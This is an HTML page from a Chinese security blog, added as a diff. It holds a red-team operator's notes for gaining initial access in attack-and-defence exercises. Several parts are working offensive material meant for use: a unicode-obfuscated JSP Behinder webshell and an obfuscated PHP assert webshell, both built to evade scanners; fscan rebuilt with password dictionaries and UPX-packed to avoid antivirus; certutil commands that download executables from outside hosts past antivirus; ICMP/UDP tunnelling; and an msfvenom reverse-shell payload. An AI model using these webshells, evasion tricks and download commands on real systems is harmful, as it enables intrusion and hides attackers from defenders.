@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CKMT2J522R"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CKMT2J522R', { 'anonymize_ip': false });
+}
+</script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  打点仔的一点素养（上） &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="安服仔 &amp;raquo; 打点仔 &amp;hellip; &amp;hellip;
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="http://92643.cn:92">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/whisper/">
+      
+      <span>离骚</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/skill/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">打点仔的一点素养（上）</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-06-17. Published at: 2022-06-20.">
+        
+          Lastmod: 2023-06-17
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>安服仔 &raquo; 打点仔 &hellip; &hellip;</p>
+<p>本人翻遍了所有小规模小范围的攻防报告。</p>
+<p>你看攻防会场熙熙攘攘，其实在座各位，2/3在互联网冲浪，3/5在外围游荡。</p>
+<p>拿权限，要么命令执行，要么文件上传。</p>
+<p>在又一次开始前提提你，打点会累会迷茫，会听着循环的背景音乐直到第五天。</p>
+<p>你要坚强，热情，自信。</p>
+<p>你可以在现场才找工具，你可以现场还在pip install报错，你可以临场囫囵吞枣翻文章。</p>
+<p>别人不过是环境搭好了，工具用顺手了，bug记住了，别人在比你更远的起点出发，不过是他们提前花了时间。</p>
+<p>你只能在现场额外用自己的时间体力的禀赋和底蕴去到达那些起点，然后再开始出发。</p>
+<p>本人害怕现场才遇到这个漏洞步骤脚本工具没找过/没做过/懒得试/懒得写/没能量克服，所以提前在这里准备好。</p>
+<p>本人害怕辛苦拿下的权限，因马子被查杀/流量告警，而暴露，所以尽量在这里临时修改别人的工具。</p>
+<p>功利得很。</p>
+<h2 id="小脚本">小脚本</h2>
+<p>批量提取文件夹内IP、链接URI</p>
+<p>参考packet-fuzzer</p>
+<h2 id="免杀webshell">免杀WEBShell</h2>
+<h3 id="jsp">JSP</h3>
+<p>主要是利用中间件unicode解析的特性，然后加多几个字母u的事情。</p>
+<p>暂时只会告可疑，D盾不检出。</p>
+<p>冰蝎3马。</p>
+<pre tabindex="0"><code>&lt;%@page import=&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;%&gt;
+&lt;%!\uu0063\uu006c\uu0061\uu0073\uu0073\uu0020\uu0055\uu0020\uuu0065\uu0078\uu0074\uuu0065\uu006e\uu0064\uu0073\uu0020\uu0043\uu006c\uu0061\uu0073\uu0073\uu004c\uu006f\uu0061\uu0064\uuu0065\uuu0072\uu007b\uu0055\uu0028\uu0043\uu006c\uu0061\uu0073\uu0073\uu004c\uu006f\uu0061\uu0064\uuu0065\uuu0072\uu0020\uu0063\uu0029\uu007b\uu0073\uu0075\uu0070\uuu0065\uuu0072\uu0028\uu0063\uu0029\uu003b\uu007d\uu0070\uu0075\uu0062\uu006c\uu0069\uu0063\uu0020\uu0043\uu006c\uu0061\uu0073\uu0073\uu0020\uu0067\uu0028\uu0062\uu0079\uu0074\uuu0065\uu0020\uu005b\uu005d\uu0062\uu0029\uu007b\uuu0072\uuu0065\uu0074\uu0075\uuu0072\uu006e\uu0020\uu0073\uu0075\uu0070\uuu0065\uuu0072\uu002e\uu0064\uuu0065\uu0066\uu0069\uu006e\uuu0065\uu0043\uu006c\uu0061\uu0073\uu0073\uu0028\uu0062\uu002c\uu0030\uu002c\uu0062\uu002e\uu006c\uuu0065\uu006e\uu0067\uu0074\uu0068\uu0029\uu003b\uu007d\uu007d%&gt;
+&lt;%\uu0069\uu0066\uu0020\uu0028\uuu0072\uuu0065\uu0071\uu0075\uuu0065\uu0073\uu0074\uu002e\uu0067\uuu0065\uu0074\uu004d\uuu0065\uu0074\uu0068\uu006f\uu0064\uu0028\uu0029\uu002e\uuu0065\uu0071\uu0075\uu0061\uu006c\uu0073\uu0028\uu0022\uu0050\uu004f\uu0053\uu0054\uu0022\uu0029\uu0029\uu007b\uu0053\uu0074\uuu0072\uu0069\uu006e\uu0067\uu0020\uu006b\uu003d\uu0022\uuu0065\uu0031\uu0030\uu0061\uu0064\uu0063\uu0033\uu0039\uu0034\uu0039\uu0062\uu0061\uu0035\uu0039\uu0061\uu0062\uu0022\uu003b\uu0073\uuu0065\uu0073\uu0073\uu0069\uu006f\uu006e\uu002e\uu0070\uu0075\uu0074\uu0056\uu0061\uu006c\uu0075\uuu0065\uu0028\uu0022\uu0075\uu0022\uu002c\uu006b\uu0029\uu003b\uu0043\uu0069\uu0070\uu0068\uuu0065\uuu0072\uu0020\uu0063\uu003d\uu0043\uu0069\uu0070\uu0068\uuu0065\uuu0072\uu002e\uu0067\uuu0065\uu0074\uu0049\uu006e\uu0073\uu0074\uu0061\uu006e\uu0063\uuu0065\uu0028\uu0022\uu0041\uu0045\uu0053\uu0022\uu0029\uu003b\uu0063\uu002e\uu0069\uu006e\uu0069\uu0074\uu0028\uu0032\uu002c\uu006e\uuu0065\uu0077\uu0020\uu0053\uuu0065\uu0063\uuu0072\uuu0065\uu0074\uu004b\uuu0065\uu0079\uu0053\uu0070\uuu0065\uu0063\uu0028\uu006b\uu002e\uu0067\uuu0065\uu0074\uu0042\uu0079\uu0074\uuu0065\uu0073\uu0028\uu0029\uu002c\uu0022\uu0041\uu0045\uu0053\uu0022\uu0029\uu0029\uu003b\uu006e\uuu0065\uu0077\uu0020\uu0055\uu0028\uu0074\uu0068\uu0069\uu0073\uu002e\uu0067\uuu0065\uu0074\uu0043\uu006c\uu0061\uu0073\uu0073\uu0028\uu0029\uu002e\uu0067\uuu0065\uu0074\uu0043\uu006c\uu0061\uu0073\uu0073\uu004c\uu006f\uu0061\uu0064\uuu0065\uuu0072\uu0028\uu0029\uu0029\uu002e\uu0067\uu0028\uu0063\uu002e\uu0064\uu006f\uu0046\uu0069\uu006e\uu0061\uu006c\uu0028\uu006e\uuu0065\uu0077\uu0020\uu0073\uu0075\uu006e\uu002e\uu006d\uu0069\uu0073\uu0063\uu002e\uu0042\uu0041\uu0053\uu0045\uu0036\uu0034\uu0044\uuu0065\uu0063\uu006f\uu0064\uuu0065\uuu0072\uu0028\uu0029\uu002e\uu0064\uuu0065\uu0063\uu006f\uu0064\uuu0065\uu0042\uu0075\uu0066\uu0066\uuu0065\uuu0072\uu0028\uuu0072\uuu0065\uu0071\uu0075\uuu0065\uu0073\uu0074\uu002e\uu0067\uuu0065\uu0074\uu0052\uuu0065\uu0061\uu0064\uuu0065\uuu0072\uu0028\uu0029\uu002e\uuu0072\uuu0065\uu0061\uu0064\uu004c\uu0069\uu006e\uuu0065\uu0028\uu0029\uu0029\uu0029\uu0029\uu002e\uu006e\uuu0065\uu0077\uu0049\uu006e\uu0073\uu0074\uu0061\uu006e\uu0063\uuu0065\uu0028\uu0029\uu002e\uuu0065\uu0071\uu0075\uu0061\uu006c\uu0073\uu0028\uu0070\uu0061\uu0067\uuu0065\uu0043\uu006f\uu006e\uu0074\uuu0065\uu0078\uu0074\uu0029\uu003b\uu007d%&gt;
+</code></pre><h3 id="php">PHP</h3>
+<p>参考一位师傅的混淆基础，做了一点改变。</p>
+<p>D盾离线测试竟然没告警。</p>
+<p>冰蝎3马，其中重要的一段eval/assert类方法混淆。</p>
+<pre tabindex="0"><code>class MOL{ public function __construct($p) 
+    {   
+        $a=null;
+        $l=null;
+        assert(&#34;/*#`echo helloworld`|W$~Q*/&#34;.$l.&#34;/*#`echo helloworld`|W$~Q*/&#34;.$p.$a.&#34;&#34;.&#34;/*#`echo helloworld`|W$~Q*/&#34;);
+        }
+</code></pre><h3 id="asp">ASP</h3>
+<p>冰蝎4默认马，D盾无检出，省事。</p>
+<p>虽然未明白传输协议怎么定制，总是报密钥错误。</p>
+<h2 id="安卓抓包测试可选">安卓抓包测试(可选</h2>
+<p>参见上一篇文章 &ndash; <a href="https://mp.weixin.qq.com/s/vqmEa21ShFY5Mfzmi60oXA">手把手安装X86-Android虚拟机</a>。</p>
+<p>KVM跑Android，又少一个打开Windows的理由。</p>
+<h2 id="exp">EXP</h2>
+<p>fastjson</p>
+<p>log4j2</p>
+<p>thinkphp</p>
+<p>shiro</p>
+<h2 id="密码口令">密码口令</h2>
+<p>外网，最直接的打开暴露面是登陆，最直接的登陆方法是密码。</p>
+<p>内网嘛，如果觉得是无人区，爆破最干脆，命中高的字典更爽快。</p>
+<p>除了常见的admin/test/root，fuzz手机号1350000000类；公司名英文或者产品名，skynet/skynet；搜集职员的中文名，工号，手机号登陆名。</p>
+<h2 id="fscan编译加壳">fscan编译加壳</h2>
+<p><strong>改动编译加壳</strong></p>
+<p>一是为了加密码字典，二是为了避过特征码查杀。</p>
+<p>因为相信，这款趁手黑客工具，只是对外攻击，又不是攻击本机，被研究的优先级不高吧。</p>
+<p>Go环境搭建</p>
+<pre tabindex="0"><code>sudo yum install golang #注意版本要高于1.17,Centos7需要手动安装，参见参考链接
+go env -w GO111MODULE=on
+go env -w GOPROXY=https://goproxy.cn,direct
+</code></pre><p>小改代码，修改远程仓库的地址为本地。网上截的一段代码，还要自己调bug，下次自己写好了。</p>
+<pre tabindex="0"><code>#encoding=utf-8
+import re
+import os
+import glob
+  
+def reset(path,old,new):
+  filelist = glob.glob(path+&#34;**&#34;,recursive=True)  # 该文件夹下所有文件（包括文件夹）
+  for files in filelist: # 遍历所有文件
+    if os.path.isdir(files):
+      continue;
+    if(&#34;image&#34; in file):
+      continue;      
+    alter(files,old_str,new_str)
+  
+def alter(file,old_str,new_str):
+  with open(file,&#34;r&#34;) as f1,open(&#34;%s.bak&#34;% file,&#34;w&#34;) as f2:
+    print(file)
+    for line in f1:
+      if old_str in line:
+        line = line.replace(old_str,new_str)  
+      f2.write(line)  
+  os.remove(file)
+  os.rename(&#34;%s.bak&#34; % file,file)
+
+#实现函数
+reset(&#34;/home/jojo/Downloads/fscan/&#34;,&#34;github.com/shadow1ng/fscan/&#34;,&#34;fscan/&#34;)
+</code></pre><p>然后在common/config.go里加上自己的一些字典。</p>
+<pre tabindex="0"><code>var Passwords = []string{&#34;123456&#34;, &#34;admin&#34;, &#34;admin123&#34;, &#34;root&#34;, &#34;&#34;, &#34;pass123&#34;, &#34;pass@123&#34;, &#34;password&#34;, &#34;123123&#34;, &#34;654321&#34;, &#34;111111&#34;, &#34;123&#34;, &#34;1&#34;, &#34;admin@123&#34;, &#34;Admin@123&#34;, &#34;admin123!@#&#34;, &#34;{user}&#34;, &#34;{user}1&#34;, &#34;{user}111&#34;, &#34;{user}123&#34;, &#34;{user}@123&#34;, &#34;{user}_123&#34;, &#34;{user}#123&#34;, &#34;{user}@111&#34;, &#34;{user}@2019&#34;, &#34;{user}@123#4&#34;, &#34;P@ssw0rd!&#34;, &#34;P@ssw0rd&#34;, &#34;Passw0rd&#34;, &#34;qwe123&#34;, &#34;12345678&#34;, &#34;test&#34;, &#34;test123&#34;, &#34;123qwe&#34;, &#34;123qwe!@#&#34;, &#34;123456789&#34;, &#34;123321&#34;, &#34;666666&#34;, &#34;a123456.&#34;, &#34;123456~a&#34;, &#34;123456!a&#34;, &#34;000000&#34;, &#34;1234567890&#34;, &#34;8888888&#34;, &#34;!QAZ2wsx&#34;, &#34;1qaz2wsx&#34;, &#34;abc123&#34;, &#34;abc123456&#34;, &#34;1qaz@WSX&#34;, &#34;a11111&#34;, &#34;a12345&#34;, &#34;Aa1234&#34;, &#34;Aa1234.&#34;, &#34;Aa12345&#34;, &#34;a123456&#34;, &#34;a123123&#34;, &#34;Aa123123&#34;, &#34;Aa123456&#34;, &#34;Aa12345.&#34;, &#34;sysadmin&#34;, &#34;system&#34;, &#34;1qaz!QAZ&#34;, &#34;2wsx@WSX&#34;, &#34;qwe123!@#&#34;, &#34;Aa123456!&#34;, &#34;A123456s!&#34;, &#34;sa123456&#34;, &#34;1q2w3e&#34;, &#34;Charge123&#34;, &#34;Aa123456789&#34;}
+</code></pre><p>跨平台编译</p>
+<pre tabindex="0"><code>#编译linux amd64平台
+env GOOS=linux GOARCH=amd64 go build -ldflags=&#34;-s -w &#34; -trimpath -o fscan_64 main.go
+#编译windows amd64平台
+env GOOS=windows GOARCH=amd64 go build -ldflags=&#34;-s -w &#34; -trimpath -o fscan_win64.exe main.go
+
+sudo yum install upx -y
+</code></pre><p>加壳</p>
+<pre tabindex="0"><code>sudo yum install upx -y
+upx -6 fscan.exe (压缩体积，有1-9级，测试得，9会被360杀毒云查杀，低一点则不会)
+
+
+#本人特意clone最新的upx编译使用
+sudo yum install g++ gcc ucl ucl-devel perl-Pod-Html
+git clone https://github.com/upx/upx.git
+cd upx
+make all
+./src/upx.out -h
+</code></pre><p><strong>撞库</strong></p>
+<p>亲测可用，只是不指定模块的话，不会爆破smb、rdp，只爆破ssh，但会有卡顿超时的情况，感觉是某些目标sshd的问题。推荐自己单独爆破smb比较好。</p>
+<pre tabindex="0"><code>fscan -h 192.168.1.1/24 -m smb -usera zhangwei -pwda 0000,Admin@90000
+</code></pre><h2 id="代理穿透">代理穿透</h2>
+<p>frp加密</p>
+<p>frp编译加壳</p>
+<h2 id="命令行下载绕过">命令行下载绕过</h2>
+<p><strong>火绒</strong></p>
+<p>1、</p>
+<pre tabindex="0"><code>certutil -split -f -urlcache http://aa.allsec.top:9999/dns.exe
+cmd /c certutil -split -f -urlcache http://61.144.19.228:10205/a.jsp
+</code></pre><p>2、</p>
+<pre tabindex="0"><code>copy c:\\windows\system32\certutil.exe c.exe
+c -urlcache -split -f http://aa.allsec.top:9999/dns.exe
+</code></pre><p>（未完</p>
+<h2 id="隧道测试">隧道测试</h2>
+<h3 id="不出网">不出网</h3>
+<p>网页，neo-regeorge</p>
+<p>前几天值班，收到一些不错的样本，其中就有混淆regeorge的样本，直接收来用，虽然已经标记已知样本了。但感觉未至于EDR查杀。</p>
+<h3 id="ptunnel-for-udpdnsicmp隧道">ptunnel for UDP/DNS/ICMP隧道</h3>
+<p>ptunnel，看来是经典，05年就停更。</p>
+<p>debian接管了的感觉，源码编译依然可用，只是可能有点卡。</p>
+<p><a href="https://salsa.debian.org/alteholz/ptunnel">ptunnel</a>, <a href="https://linux.die.net/man/8/ptunnel">ptunnel(8) - Linux man page</a></p>
+<p><strong>编译ptunnel</strong></p>
+<p>linnux</p>
+<pre tabindex="0"><code>git clone https://salsa.debian.org/alteholz/ptunnel.git
+cd ptunnel
+make
+</code></pre><p>windows</p>
+<pre tabindex="0"><code>1、下载安装mingw，以获得make能力。
+在线GUI方式安装，访问https://osdn.net/projects/mingw/，下载mingw-get-setup.exe，安装，勾选mingw32-base-bin，左上角apply。
+然后添加系统变量PATH，C:\MinGW\bin
+
+也可以离线安装，访问
+https://sourceforge.net/projects/mingw-w64/files/，选择MinGW-W64 GCC-8.1.0 -&gt; x86_64-win32-sjlj，下载,解压缩，放到C:\MinGW目录，然后添加系统变量PATH，C:\MinGW\bin。从而获得c、c++编译能力
+
+2、测试命令行能用mingw32-make.exe命令，即可。
+
+3、再准备WinPcap library编译库。下载http://www.winpcap.org/install/bin/WpdPack_4_0_2.zip，解压，放到c:\Program Files\WpdPack\目录。
+
+4、编译
+#源代码里面预定义重复地写了两遍，导致报错
+#ptunnel.c的362-379行需要注释掉，才能编译通过。
+#编译，ok
+mingw32-make.exe ptunnel.exe
+</code></pre><p>服务端</p>
+<pre tabindex="0"><code>sudo ./ptunnel -udp
+</code></pre><p>客户端</p>
+<p>意思就是客户端监听8000端口，并转发至服务端的8001端口</p>
+<pre tabindex="0"><code>sudo ./ptunnel -p 114.115.116.117 -lp 8000 -da 114.115.116.117 -dp 8001 -c eth0 -udp
+</code></pre><p>msf生成反向的shell</p>
+<pre tabindex="0"><code>#反向地址指向客户端的8000端口
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter_reverse_https LHOST=127.0.0.1 LPORT=8000 -f elf -o msfshell
+#运行，上线。
+</code></pre><h2 id="参考链接">参考链接</h2>
+<p><a href="https://xw.qq.com/cmsid/20220530A04RST00">干货｜从Certutil下载绕过探究常见杀软的绕过思路</a></p>
+<p><a href="https://blog.csdn.net/sunyoop/article/details/78301268">upx工具编译使用指导</a></p>
+<p><a href="https://www.digitalocean.com/community/tutorials/how-to-build-go-executables-for-multiple-platforms-on-ubuntu-16-04">How To Build Go Executables for Multiple Platforms on Ubuntu 16.04</a></p>
+<p><a href="https://www.cnblogs.com/nickchou/p/13252545.html">centos 7 安装golang1.17</a></p>
+<p><a href="https://blog.51cto.com/u_15353042/3751541">python批量替换文本文件内容</a></p>
+<p><a href="https://www.freebuf.com/articles/web/338563.html">冰蝎Webshell的免杀实战</a></p>
+<p><a href="https://xz.aliyun.com/t/7701#toc-8">内网渗透之内网穿透</a></p>
+<p><a href="https://salsa.debian.org/alteholz/ptunnel/-/blob/master/README">ptunnel README</a></p>
+<p><a href="http://c.biancheng.net/view/8077.html">MinGW下载和安装教程</a></p>
+<p><a href="https://blog.csdn.net/ZHAOJUNWEI08/article/details/86602120">MinGW-w64离线安装，测试可用</a></p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>打点仔的一点素养（上）</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#小脚本">小脚本</a></li>
+    <li><a href="#免杀webshell">免杀WEBShell</a>
+      <ul>
+        <li><a href="#jsp">JSP</a></li>
+        <li><a href="#php">PHP</a></li>
+        <li><a href="#asp">ASP</a></li>
+      </ul>
+    </li>
+    <li><a href="#安卓抓包测试可选">安卓抓包测试(可选</a></li>
+    <li><a href="#exp">EXP</a></li>
+    <li><a href="#密码口令">密码口令</a></li>
+    <li><a href="#fscan编译加壳">fscan编译加壳</a></li>
+    <li><a href="#代理穿透">代理穿透</a></li>
+    <li><a href="#命令行下载绕过">命令行下载绕过</a></li>
+    <li><a href="#隧道测试">隧道测试</a>
+      <ul>
+        <li><a href="#不出网">不出网</a></li>
+        <li><a href="#ptunnel-for-udpdnsicmp隧道">ptunnel for UDP/DNS/ICMP隧道</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    <div>
+      
+    </div>
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
